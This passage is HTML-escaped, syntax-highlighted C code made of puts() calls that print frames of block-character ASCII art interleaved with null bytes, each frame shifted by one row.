&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span 